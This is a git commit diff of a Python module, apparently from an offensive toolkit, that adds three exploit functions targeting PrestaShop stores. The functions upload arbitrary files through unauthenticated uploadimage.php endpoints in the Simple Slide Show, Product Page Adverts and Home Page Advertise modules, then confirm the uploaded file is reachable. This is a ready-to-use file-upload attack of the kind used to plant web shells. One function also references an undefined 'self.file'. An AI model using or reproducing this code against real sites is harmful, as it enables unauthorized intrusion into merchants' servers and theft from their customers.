28cee54f9f36e8dceb777c2b6c7368b28b62ad93
Debby Anggraini <Xnver404@gmail.com>
2018-08-09 20:44:15 +0700

    Add files via upload

--- module/prestashop.py
+++ module/prestashop.py
@@ -5,24 +5,49 @@
 from core.misc import printf
 import requests
 
-class exp:
-    def __init__(self,web,file):
-        if 'http' not in web:
-            try:
-                requests.get('http://' + web)
-                self.url = 'http://' + web
-            except:
-                self.url = 'https://' + web
-        else:
-            self.url = web
-        self.file = file
-    def sss_ex(self):
-        printf('[+] start uploading files (%s)' % self.file)
-        files={'userfile':(self.file, open(self.file,'rb'),'multipart/form-data')}
-        requests.post(self.url + "/modules/simpleslideshow/uploadimage.php",files=files)
-        cek = requests.get(self.url + '/modules/simpleslideshow/slides/slides/' + self.file)
-        if cek.status_code == 200:
-            printf('[+] Success uploaded')
-            printf('    => link: %s' % r.url)
-        else:
-            printf('[!] Failed uploaded!')
+def parse(web):
+    if 'http' not in web:
+        try:
+            requests.get('http://' + web)
+            return 'http://' + web
+        except:
+            return  'https://' + web
+    else:
+        return  web
+def sss_ex(web,file):
+    url = parse(web)
+    printf('[+] Simple Slide Show exploit')
+    printf('[+] start uploading files (%s)' % file)
+    files={'userfile':(file, open(file,'rb'),'multipart/form-data')}
+    requests.post(url + "/modules/simpleslideshow/uploadimage.php",files=files)
+    cek = requests.get(url + '/modules/simpleslideshow/slides/' + file)
+    if cek.status_code == 200:
+        printf('[+] Files successfully uploaded')
+        printf('    => link: %s' % cek.url)
+    else:
+        printf('[!] Failed to upload files, maybe website is not vulnerable')
+def ppa_ex(web,file):
+    url = parse(web)
+    printf('[+] Product Page adverts Exploit')
+    printf('[+] start uploading files (%s)' % file)
+    files = {'userfile':(file, open(file,'rb'),'multipart/form-data')}
+    requests.post(url + "/modules/productpageadverts/uploadimage.php",files=files)
+    cek = requests.get(url + '/modules/productpageadverts/slides/' + file)
+    if cek.status_code == 200:
+        printf('[+] Files successfully uploaded')
+        printf('    => link: %s' % cek.url)
+    else:
+        printf('[!] Failed to upload files, maybe website is not vulnerable!')
+def hpa_ex(web,file):
+    url = parse(web)
+    printf('[+] Home Page Advertise Exploit')
+    printf('[+] start uploading files (%s)' % file)
+    files = {'userfile':(file, open(file,'rb'),'multipart/form-data')}
+    requests.post(url + "/modules/homepageadvertise/uploadimage.php",files=files)
+    cek = requests.get(url + "/modules/homepageadvertise/slides/" + self.file)
+    if cek.status_code == 200:
+        printf('[+] Files successfully uploaded')
+        printf('    => link: %s' % cek.url)
+    else:
+        printf('[!] Failed to upload files, maybe website is not vulnerable!')
+
